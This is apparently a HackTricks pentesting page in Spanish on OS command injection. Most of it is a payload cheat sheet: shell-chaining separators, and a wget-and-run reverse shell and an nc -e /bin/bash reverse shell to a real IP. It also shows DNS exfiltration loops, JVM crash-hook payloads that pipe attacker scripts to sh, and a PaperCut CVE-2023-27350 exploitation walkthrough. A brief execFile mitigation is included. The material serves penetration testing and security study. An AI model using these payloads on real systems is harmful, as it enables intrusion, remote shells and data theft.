# Command Injection

{{#include ../banners/hacktricks-training.md}}

## ¿Qué es command Injection?

A **command injection** permite la ejecución de comandos arbitrarios del sistema operativo por parte de un atacante en el servidor que aloja una aplicación. Como resultado, la aplicación y todos sus datos pueden quedar completamente comprometidos. La ejecución de estos comandos típicamente permite al atacante obtener acceso no autorizado o control sobre el entorno de la aplicación y el sistema subyacente.

### Contexto

Dependiendo de **dónde se esté inyectando tu entrada** puede que necesites **cerrar el contexto entrecomillado** (usando `"` o `'`) antes de los comandos.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limitación** Bypasses

Si estás intentando ejecutar **comandos arbitrarios dentro de una máquina Linux** te interesará leer acerca de estos **Bypasses:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Ejemplos**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parámetros

Aquí están los 25 parámetros principales que podrían ser vulnerables a code injection y a vulnerabilidades RCE similares (de [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Extracción de datos: carácter por carácter
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### Exfiltración de datos basada en DNS

Basado en la herramienta de `https://github.com/HoLyVieR/dnsbin`, también alojada en dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Herramientas online para comprobar DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Al auditar back-ends de JavaScript/TypeScript, a menudo te encontrarás con la API de Node.js `child_process`.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` spawns a **shell** (`/bin/sh -c`), por lo que cualquier carácter que tenga un significado especial para la shell (back-ticks, `;`, `&&`, `|`, `$()`, …) resultará en **command injection** cuando la entrada del usuario se concatene en la cadena.

**Mitigación:** usa `execFile()` (o `spawn()` sin la opción `shell`) y proporciona **cada argumento como un elemento separado del array** para que no intervenga la shell:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Caso real: *Synology Photos* ≤ 1.7.0-0794 fue explotable mediante un evento WebSocket no autenticado que colocaba datos controlados por el atacante en `id_user`, los cuales se incrustaban posteriormente en una llamada a `exec()`, logrando RCE (Pwn2Own Ireland 2024).

### Inyección de argumentos/opciones mediante guion inicial (argv, sin metacaracteres de shell)

No todas las inyecciones requieren metacaracteres de shell. Si la aplicación pasa cadenas no confiables como argumentos a una utilidad del sistema (incluso usando `execve`/`execFile` y sin shell), muchos programas seguirán interpretando cualquier argumento que empiece con `-` o `--` como una opción. Esto permite a un atacante cambiar modos, modificar rutas de salida o activar comportamientos peligrosos sin necesidad de acceder a un shell.

Lugares típicos donde aparece esto:

- Interfaces web embebidas/controladores CGI que construyen comandos como `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, etc.
- Enrutadores CGI centralizados (p. ej., `/cgi-bin/<something>.cgi` con un parámetro selector como `topicurl=<handler>`) donde múltiples handlers reutilizan el mismo validador débil.

Qué probar:

- Proporcionar valores que empiecen con `-`/`--` para que sean interpretados como flags por la herramienta downstream.
- Abusar de flags que cambian el comportamiento o escriben archivos, por ejemplo:
  - `ping`: `-f`/`-c 100000` para sobrecargar el dispositivo (DoS)
  - `curl`: `-o /tmp/x` para escribir rutas arbitrarias, `-K <url>` para cargar configuración controlada por el atacante
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` para lograr ejecución post-rotación en wrappers inseguros
- Si el programa soporta el `--` (fin de opciones), intenta evadir mitigaciones ingenuas que anteponen `--` en el lugar equivocado.

Formas genéricas de PoC contra despachadores CGI centralizados:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### Callbacks de diagnóstico de JVM para ejecución garantizada

Cualquier primitiva que te permita **inyectar argumentos de línea de comandos de JVM** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.) puede convertirse en un RCE fiable sin tocar el bytecode de la aplicación:

1. **Forzar un crash determinista** reduciendo metaspace o el heap: `-XX:MaxMetaspaceSize=16m` (o un pequeño `-Xmx`). Esto garantiza un `OutOfMemoryError` incluso durante el bootstrap temprano.
2. **Adjuntar un hook de error**: `-XX:OnOutOfMemoryError="<cmd>"` o `-XX:OnError="<cmd>"` ejecuta un comando arbitrario del SO siempre que la JVM se aborte.
3. Opcionalmente añade `-XX:+CrashOnOutOfMemoryError` para evitar intentos de recuperación y mantener el payload de un solo uso.

Example payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Because these diagnostics are parsed by the JVM itself, no shell metacharacters are required and the command runs with the same integrity level as the launcher. Desktop IPC bugs that forward user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) therefore translate directly into OS command execution.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- Vulnerable NG/MF builds (e.g., 22.0.5 Build 63914) exponen `/app?service=page/SetupCompleted`; al navegar allí y hacer clic en **Login** se devuelve un `JSESSIONID` válido sin credenciales (authentication bypass en el flujo de setup).
- En **Options → Config Editor**, ajusta `print-and-device.script.enabled=Y` y `print.script.sandboxed=N` para activar el scripting de impresora y deshabilitar el sandbox.
- En la pestaña **Scripting** de la impresora, habilita el script y deja `printJobHook` definido para evitar errores de validación, pero coloca el payload **fuera** de la función para que se ejecute inmediatamente cuando hagas clic en **Apply** (no se necesita un print job):
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- Cambia el callback por un reverse shell; si la UI/PoC no puede manejar pipes/redirects, prepara un payload con un comando y ejecútalo (exec) con una segunda request.
- El [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py) de Horizon3 automatiza el auth bypass, config flips, command execution, and rollback—ejecútalo a través de un upstream proxy (e.g., `proxychains` → Squid) cuando el servicio solo sea accesible internamente.

## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## Referencias

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
